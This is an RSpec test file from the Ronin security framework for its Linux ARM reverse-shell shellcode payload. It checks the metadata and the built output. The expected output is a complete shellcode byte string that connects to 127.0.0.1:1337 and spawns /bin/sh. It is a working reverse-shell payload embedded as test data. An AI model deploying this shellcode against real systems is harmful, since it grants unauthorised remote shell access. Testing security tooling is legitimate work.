require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/linux/arm/reverse_shell'

describe Ronin::Payloads::Shellcode::Linux::ARM::ReverseShell do
  it "must inherit from Ronin::Payloads::Shellcode::ReverseShellPayload" do
    expect(described_class).to be < Ronin::Payloads::Shellcode::ReverseShellPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/linux/arm/reverse_shell'" do
      expect(subject.id).to eq('shellcode/linux/arm/reverse_shell')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :arm" do
      expect(subject.arch).to be(:arm)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :linux" do
      expect(subject.os).to be(:linux)
    end
  end

  let(:host) { '127.0.0.1' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x01\x10\x8F\xE2\x11\xFF\x2F\xE1\x02\x20\x01\x21\x92\x1a\x0f\x02\x19\x37\x01\xdf\x06\x1c\x08\xa1\x10\x22\x02\x37\x01\xdf\x3f\x27\x02\x21\x30\x1c\x01\xdf\x01\x39\xfb\xd5\x05\xa0\x92\x1a\x05\xb4\x69\x46\x0b\x27\x01\xdf\xc0\x46\x02\x00\x05\x39\x7f\x00\x00\x01/bin/sh\0".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
